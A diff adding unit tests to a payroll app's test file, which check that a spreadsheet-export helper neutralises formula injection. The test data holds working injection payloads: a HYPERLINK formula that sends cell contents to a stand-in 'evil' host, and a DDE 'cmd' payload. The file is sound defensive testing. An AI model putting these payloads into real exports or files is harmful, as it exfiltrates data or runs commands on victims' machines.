@@ -24,6 +24,7 @@ os.environ["PERSISTENCE_REQUIRED"] = "false"
 from werkzeug.datastructures import FileStorage  # noqa: E402
 
 from app import create_app  # noqa: E402
+from app.csv_safety import escape_formula, escape_row  # noqa: E402
 from app.distribution.channels import (  # noqa: E402
     ConsoleEmailSender,
     ConsoleSmsSender,
@@ -285,6 +286,61 @@ class F2SpreadsheetUploadValidationTests(unittest.TestCase):
             handle.write(self.real_xlsx)
         with self.app.app_context():
             assert_workbook_within_limits(path)  # must not raise
+
+
+class F3FormulaInjectionTests(unittest.TestCase):
+    """F3 — one helper, applied wherever a value becomes a cell."""
+
+    ATTACKS = (
+        '=HYPERLINK("http://evil/?d="&A1,"payslip")',
+        "+1+1",
+        "-2+3",
+        "@SUM(A1)",
+        "\t=cmd|' /C calc'!A0",
+        "\r=cmd",
+    )
+
+    def test_every_trigger_character_is_neutralised(self):
+        for attack in self.ATTACKS:
+            with self.subTest(attack=attack):
+                escaped = escape_formula(attack)
+                self.assertTrue(escaped.startswith("'"))
+                self.assertEqual(escaped[1:], attack)
+
+    def test_ordinary_text_is_untouched(self):
+        for value in ("Ama Mensah", "DCL9", "", "Accra Main Branch"):
+            self.assertEqual(escape_formula(value), value)
+
+    def test_non_strings_keep_their_type_so_exports_still_sum(self):
+        """The regression that would silently break every payroll total."""
+        for value in (4231.55, -500.25, 0, 7, None, True):
+            result = escape_formula(value)
+            self.assertEqual(result, value)
+            self.assertIs(type(result), type(value))
+
+    def test_escape_row_applies_across_a_row(self):
+        self.assertEqual(
+            escape_row(["=cmd", "Ama", -500.25, 3]), ["'=cmd", "Ama", -500.25, 3]
+        )
+
+    def test_a_generated_workbook_contains_no_live_formula(self):
+        import openpyxl
+
+        from app.excel_utils import create_workbook, save_workbook, write_table
+
+        evil = '=HYPERLINK("http://evil/?x="&A1,"click")'
+        directory = tempfile.mkdtemp()
+        with _app().app_context():
+            workbook, sheet = create_workbook("Bank Listing", org_name=evil)
+            write_table(sheet, 5, ["Staff ID", "Name", "Net Pay"],
+                        [[evil, "Ama Mensah", 4231.55]])
+            path = save_workbook(workbook, directory, "listing.xlsx")
+
+        sheet = openpyxl.load_workbook(path).active
+        for coordinate in ("A1", "A6", "B6"):
+            self.assertNotEqual(sheet[coordinate].data_type, "f",
+                                f"{coordinate} was stored as a live formula")
+        self.assertEqual(sheet["C6"].value, 4231.55)  # amount still numeric
 
 
 if __name__ == "__main__":
